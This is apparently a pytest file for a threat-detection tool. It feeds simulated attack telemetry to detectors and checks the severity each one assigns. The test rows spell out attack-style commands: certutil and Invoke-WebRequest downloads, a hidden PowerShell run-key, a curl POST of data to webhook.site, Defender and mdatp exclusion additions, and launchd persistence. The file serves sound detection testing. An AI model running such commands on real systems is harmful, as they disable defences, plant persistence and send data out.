"""Recall: the approved attack-simulation plan, replayed OFFLINE against the real detector
logic. Each case is the MDE row(s) that one simulation produces (the shape a detector's
to_findings receives after its KQL summarize); we assert the right detector fires at the right
severity. This covers parsing and severity classification, NOT the upstream KQL rarity gate —
that half is confirmed against live fleet data (see docs/sentinel-shadow.md "Recall").

The live, end-to-end version (injecting on a device in EDR_TEST_DEVICES) is Option A, run by
hand. Run: python -m pytest shadow_hunter/recall_test.py -q
"""
from __future__ import annotations

import pytest

from shadow_hunter.behavior import device_key, score_entities, severity_for
from shadow_hunter.detectors.defender_exclusions import DefenderExclusionsDetector
from shadow_hunter.detectors.encoded_powershell import EncodedPowerShellDetector
from shadow_hunter.detectors.exfil_patterns import ExfilPatternsDetector
from shadow_hunter.detectors.lolbin_abuse import LOLBinAbuseDetector
from shadow_hunter.detectors.rare_domains import RareDomainsDetector
from shadow_hunter.detectors.rare_persistence import RarePersistenceDetector
from shadow_hunter.detectors.remote_logons import RemoteLogonsDetector

CATCHER = "shadowsim-catcher.requestcatcher.com"

# (label, detector, row, expected severity) — one simulation each.
CASES = [
    ("1 encoded-PS download", EncodedPowerShellDetector(), {
        "DeviceName": "WINTEST", "DeviceId": "w1", "FleetDevices": 1, "InitiatingProcessFileName": "cmd.exe",
        "Shape": f"cmd.exe|invoke-webrequest https://{CATCHER}/s#",
        "Decoded": f"Write-Output 'shadowsim-1'; Invoke-WebRequest https://{CATCHER}/s1 | Out-Null",
        "ProcessCommandLine": "powershell.exe -enc <b64>", "Accounts": ["tester"]}, "high"),
    ("2 certutil download", LOLBinAbuseDetector(), {
        "DeviceName": "WINTEST", "DeviceId": "w1", "FileName": "certutil.exe", "FleetDevices": 1,
        "Shape": "certutil.exe|-urlcache -split -f",
        "SampleCommands": [f"certutil -urlcache -split -f https://{CATCHER}/s2 %TEMP%\\shadowsim2.txt"],
        "Parents": ["cmd.exe"], "Accounts": ["tester"]}, "high"),
    ("3a run-key script-writer", RarePersistenceDetector(), {
        "DeviceName": "WINTEST", "DeviceId": "w1", "Mechanism": "run_key", "Item": "shadowsim3", "FleetDevices": 1,
        "Writers": ["powershell.exe"], "WriterPaths": ["c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"],
        "Samples": ["...\\Run\\ShadowSim3 = powershell -w hidden -f %TEMP%\\shadowsim3.ps1"]}, "high"),
    ("3b persistence->new-domain", RareDomainsDetector(), {
        "Destination": CATCHER, "Devices": ["WINTEST"], "DeviceIds": ["w1"], "DaysSeen": 1,
        "Interp": 1, "Detached": 1, "RareBinary": 0,
        "InitiatingProcesses": ["powershell.exe"], "ParentProcesses": ["services.exe"], "FleetDevices": 1}, "high"),
    ("4 microsoft-folder task", RarePersistenceDetector(), {
        "DeviceName": "WINTEST", "DeviceId": "w1", "Mechanism": "scheduled_task",
        "Item": "\\microsoft\\windows\\shadowsim4", "FleetDevices": 1, "Writers": [], "WriterPaths": [],
        "Samples": ["{\"Actions\":{\"Exec\":{\"Command\":\"powershell\",\"Arguments\":\"-c echo shadowsim4\"}}}"]}, "medium"),
    ("5 defender exclusion", DefenderExclusionsDetector(), {
        "DeviceName": "WINTEST", "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessAccountName": "tester",
        "ExclusionTypes": ["Paths"], "Values": ["C:\\ShadowSim5"], "Count": 1,
        "InitiatingProcessCommandLine": "powershell.exe -Command Add-MpPreference -ExclusionPath C:\\ShadowSim5"}, "high"),
    ("6 curl->webhook", ExfilPatternsDetector(), {
        "DeviceName": "WINTEST", "DeviceId": "w1", "InitiatingProcessFileName": "curl.exe", "Hosts": ["webhook.site"],
        "ConnectionCount": 1, "Accounts": ["tester"], "CommandLines": ["curl.exe -X POST -d shadowsim6 https://webhook.site/t"]}, "high"),
    ("7 RDP new target+source", RemoteLogonsDetector(), {
        "DeviceName": "WINTEST", "DeviceId": "w1", "AccountName": "tester.admin", "AccountDomain": "corp",
        "LogonCount": 1, "SourceIPs": ["10.80.5.9"], "Public": 0, "NewAccount": 0, "NewTarget": 1, "NewSource": 1,
        "HistTargets": 4}, "medium"),
    ("9a mac launchd python", RarePersistenceDetector(), {
        "DeviceName": "MACTEST", "DeviceId": "m1", "Mechanism": "launchd", "Item": "com.shadowsim.agent.plist",
        "FleetDevices": 1, "Writers": ["python3"], "WriterPaths": ["/usr/bin/python3"],
        "Samples": ["launchctl bootstrap gui/501 ~/Library/LaunchAgents/com.shadowsim.agent.plist"]}, "high"),
    ("9b mac persistence->domain", RareDomainsDetector(), {
        "Destination": CATCHER, "Devices": ["MACTEST"], "DeviceIds": ["m1"], "DaysSeen": 1,
        "Interp": 1, "Detached": 1, "RareBinary": 0,
        "InitiatingProcesses": ["python3"], "ParentProcesses": ["launchd"], "FleetDevices": 1}, "high"),
    ("10 mdatp exclusion", DefenderExclusionsDetector(), {
        "DeviceName": "MACTEST", "InitiatingProcessFileName": "mdatp", "InitiatingProcessAccountName": "tester",
        "ExclusionTypes": ["folder"], "Values": ["/tmp/shadowsim10"], "Count": 1,
        "InitiatingProcessCommandLine": "mdatp exclusion folder add --path /tmp/shadowsim10"}, "high"),
]


@pytest.mark.parametrize("label,detector,row,want", CASES, ids=[c[0] for c in CASES])
def test_each_simulation_is_caught(label, detector, row, want):
    findings = detector.to_findings([row])
    assert findings, f"{label}: no finding"
    assert findings[0]["severity"] == want, f"{label}: got {findings[0]['severity']}, want {want}"


def test_the_windows_box_with_several_signals_tops_the_behaviour_queue():
    # items 1-7 on one device in one day: novel risky lineages from persistence, a rare
    # destination, new persistence, and new RDP access — different kinds, which is the shape.
    docs = [{"day": "2026-10-06", "L": f"services > powershell > t{i}", "interp": True, "sens": False,
             "det": True, "devices": [{"id": "w1", "name": "WINTEST", "n": 1, "cmd": f"shadowsim-{i}"}]}
            for i in range(3)]
    net = {device_key("WINTEST", "w1"): {"high": 1, "medium": 2}}
    persist = {device_key("WINTEST", "w1"): ["run_key:shadowsim3", "scheduled_task:\\microsoft\\windows\\shadowsim4"]}
    access = {device_key("WINTEST", "w1"): ["tester.admin from 10.80.5.9"]}
    ent = score_entities(docs, {}, set(), net, {}, set(), {}, persist, access)
    e = next(x for x in ent if x["device"].startswith("WINTEST"))
    assert severity_for(e) == "high" and e["stages"] >= 4
